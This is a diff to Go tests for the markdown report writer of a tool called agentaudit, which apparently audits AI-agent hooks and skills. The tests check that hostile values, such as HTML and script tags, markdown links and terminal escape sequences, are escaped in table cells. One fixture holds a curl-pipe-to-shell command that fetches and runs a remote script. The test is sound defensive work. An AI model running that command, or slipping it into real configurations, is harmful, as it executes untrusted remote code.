@@ -68,8 +68,8 @@ func TestWrite_PipeInCapabilityValueDoesNotBreakTableColumns(t *testing.T) {
 	}
 
 	row := findRow(t, buf.String(), "inlineshell.command")
-	if !strings.Contains(row, `curl -s https://x.tld/i.sh \| sh`) {
-		t.Fatalf("row = %q, want it to contain the escaped pipe %q", row, `curl -s https://x.tld/i.sh \| sh`)
+	if !strings.Contains(row, `curl -s https&#58;//x.tld/i.sh \| sh`) {
+		t.Fatalf("row = %q, want it to contain the escaped pipe %q", row, `curl -s https&#58;//x.tld/i.sh \| sh`)
 	}
 
 	const wantColumnDelimiters = 8 // one per column boundary, including the row's own leading and trailing pipe
@@ -109,6 +109,23 @@ func TestWrite_EscapesAdversarialCellValues(t *testing.T) {
 		{"c1CSI", "a\u009bb", `a\\u009bb`},
 		{"rightToLeftOverride", "a\u202eb", `a\\u202eb`},
 		{"invalidByte", "a" + string([]byte{0x80}) + "b", `a\\x80b`},
+		{"htmlComment", "a <!-- b --> c", `a &lt;!-- b --&gt; c`},
+		{"detailsElement", "a<details>b</details>", `a&lt;details&gt;b&lt;/details&gt;`},
+		{"imgElement", "<img src=x>", `&lt;img src=x&gt;`},
+		{"scriptElement", "<script>x</script>", `&lt;script&gt;x&lt;/script&gt;`},
+		{"cellBreakout", "a</td><td>b", `a&lt;/td&gt;&lt;td&gt;b`},
+		{"namedEntity", "&lt;b&gt;", `&amp;lt;b&amp;gt;`},
+		{"bidiEntity", "&#x202e;b", `&amp;&#35;x202e;b`},
+		{"backtick", "a `b` c", "a &#96;b&#96; c"},
+		{"link", "[x](https://example.invalid)", `&#91;x](https&#58;//example.invalid)`},
+		{"image", "![x](https://example.invalid/p.png)", `!&#91;x](https&#58;//example.invalid/p.png)`},
+		{"asteriskEmphasis", "Bash(*:*)", `Bash(&#42;:&#42;)`},
+		{"underscoreEmphasis", "_a_", `&#95;a&#95;`},
+		{"tildeStrikethrough", "~a~", `&#126;a&#126;`},
+		{"hash", "a # b", `a &#35; b`},
+		{"dollarMath", "a $x % hidden$ b", `a &#36;x % hidden&#36; b`},
+		{"schemeURL", "https://example.invalid/a_b?x=1&y=2~z*w", `https&#58;//example.invalid/a&#95;b?x=1&amp;y=2&#126;z&#42;w`},
+		{"wwwURL", "www.example.invalid/a_b", `www&#46;example.invalid/a&#95;b`},
 	}
 
 	for _, tt := range tests {
@@ -245,10 +262,7 @@ func TestWrite_DuplicateEntityDistinctGroupsDistinctIDs(t *testing.T) {
 // Identity() joins its parts with 0x1f, and report.Escape neutralises that
 // byte regardless of source, so a raw-0x1f check alone cannot distinguish a
 // row rendered through report.Describe from one that leaked the entity's raw
-// Identity() instead — both would show zero raw 0x1f once escaped. This
-// checks for the fully composed spelling a leaked Identity() would actually
-// produce on the page: report.Escape, then escapeCell in the same order
-// every cell gets — a spelling only a leak would produce.
+// Identity() instead — both would show zero raw 0x1f once escaped.
 func TestWrite_RowNeverContainsEscapedEntityIdentityString(t *testing.T) {
 	rep := reportfixture.Report()
 	var buf bytes.Buffer
@@ -258,9 +272,7 @@ func TestWrite_RowNeverContainsEscapedEntityIdentityString(t *testing.T) {
 	doc := buf.String()
 
 	for _, f := range rep.Findings() {
-		leaked := strings.ReplaceAll(report.Escape(f.Capability.Entity.Identity()), `\`, `\\`)
-		leaked = strings.ReplaceAll(leaked, "|", `\|`)
-		leaked = strings.ReplaceAll(leaked, "·", "\\u00b7")
+		leaked := mdreport.EscapeCell(report.Escape(f.Capability.Entity.Identity()))
 		if strings.Contains(doc, leaked) {
 			t.Fatalf("doc contains the escaped Entity.Identity() string %q for rule %q, want writeRow to render via report.Describe instead", leaked, f.RuleID)
 		}
@@ -697,7 +709,7 @@ func TestWrite_HazardousReport_NoRawEscapeByteInDocument(t *testing.T) {
 	if gotRows := strings.Count(doc, "| hazard"); gotRows != wantRows {
 		t.Fatalf("Write() rendered %d table rows, want %d\ndoc:\n%s", gotRows, wantRows, doc)
 	}
-	if !strings.Contains(doc, `\x1b[2J`) {
+	if !strings.Contains(doc, `\x1b&#91;2J`) {
 		t.Fatalf("Write() = %q, want it to contain the escaped hazard spelling", doc)
 	}
 	if strings.ContainsRune(doc, '\x1b') {
@@ -720,5 +732,106 @@ func TestWrite_H1_EscapesItsOwnSeparator(t *testing.T) {
 	}
 	if !strings.HasSuffix(h1, `proj \u00b7 evil`) {
 		t.Fatalf("H1 %q, want the scanned name whole with its separator escaped", h1)
+	}
+}
+
+// A hostile matcher or path cannot split a column or open a tag.
+func TestWrite_CapabilityAndLocationCellsKeepTheirColumns(t *testing.T) {
+	const hostile = "a|b<img src=x>"
+	tests := []struct {
+		name   string
+		entity finding.Entity
+		file   string
+	}{
+		{"matcher", ir.Hook{Event: "PreToolUse", Matcher: hostile, Command: "x"}, "probe.json"},
+		{"path", ir.Skill{Name: "solo"}, hostile + ".json"},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			f := finding.Finding{
+				RuleID:     "probe.column",
+				Categories: []finding.Category{"probe"},
+				Capability: finding.Capability{Entity: tt.entity, Provenance: finding.Provenance{File: tt.file}},
+			}
+
+			var buf bytes.Buffer
+			if err := mdreport.Write(&buf, finding.NewReport([]finding.Finding{f}), mdreport.Meta{Path: "."}); err != nil {
+				t.Fatalf("Write() error = %v, want nil", err)
+			}
+
+			row := findRow(t, buf.String(), "probe.column")
+			if !strings.Contains(row, `a\|b&lt;img src=x&gt;`) {
+				t.Fatalf("row = %q, want the hostile text escaped in its own cell", row)
+			}
+			if got := unescapedPipes(row); got != 8 {
+				t.Fatalf("unescapedPipes(row) = %d, want 8 (row: %q)", got, row)
+			}
+			if strings.Contains(row, "<") {
+				t.Fatalf("row = %q, want no raw angle bracket left to open a tag", row)
+			}
+		})
+	}
+}
+
+// Sibling paths that differ only by a trailing # run or trailing spaces keep
+// distinct H1 lines: CommonMark strips both from a heading.
+func TestWrite_H1_KeepsSiblingPathsDistinct(t *testing.T) {
+	tests := []struct {
+		name string
+		path string
+		want string
+	}{
+		{"bare", "pkg", "# agentaudit · pkg"},
+		{"closingHash", "pkg #", "# agentaudit · pkg &#35;"},
+		{"closingHashRun", "pkg ##", "# agentaudit · pkg &#35;&#35;"},
+		{"trailingSpace", "pkg ", "# agentaudit · pkg&#32;"},
+		{"trailingSpaces", "pkg  ", "# agentaudit · pkg&#32;&#32;"},
+		{"closingHashThenSpace", "pkg # ", "# agentaudit · pkg &#35;&#32;"},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			var buf bytes.Buffer
+			if err := mdreport.Write(&buf, finding.NewReport(nil), mdreport.Meta{Path: tt.path}); err != nil {
+				t.Fatalf("Write() error = %v, want nil", err)
+			}
+			if h1 := strings.SplitN(buf.String(), "\n", 2)[0]; h1 != tt.want {
+				t.Fatalf("H1 = %q, want %q", h1, tt.want)
+			}
+		})
+	}
+}
+
+// A pipe in a reference cannot split a column.
+func TestWrite_ReferenceStaysALink(t *testing.T) {
+	tests := []struct {
+		name string
+		ref  string
+		want string
+	}{
+		{"queryAndFragment", "https://example.invalid/a_b?x=1&y=2#c", "https://example.invalid/a_b?x=1&y=2#c"},
+		{"pipe", "https://example.invalid/a|b", `https://example.invalid/a\|b`},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			f := finding.Finding{
+				RuleID:     "probe.reference",
+				Categories: []finding.Category{"probe"},
+				References: []string{tt.ref},
+				Capability: finding.Capability{Entity: ir.Skill{Name: "solo"}, Provenance: finding.Provenance{File: "a.json"}},
+			}
+
+			var buf bytes.Buffer
+			if err := mdreport.Write(&buf, finding.NewReport([]finding.Finding{f}), mdreport.Meta{Path: "."}); err != nil {
+				t.Fatalf("Write() error = %v, want nil", err)
+			}
+
+			row := findRow(t, buf.String(), "probe.reference")
+			if !strings.Contains(row, "| "+tt.want+" |") {
+				t.Fatalf("row = %q, want the References cell %q", row, tt.want)
+			}
+			if got := unescapedPipes(row); got != 8 {
+				t.Fatalf("unescapedPipes(row) = %d, want 8 (row: %q)", got, row)
+			}
+		})
 	}
 }
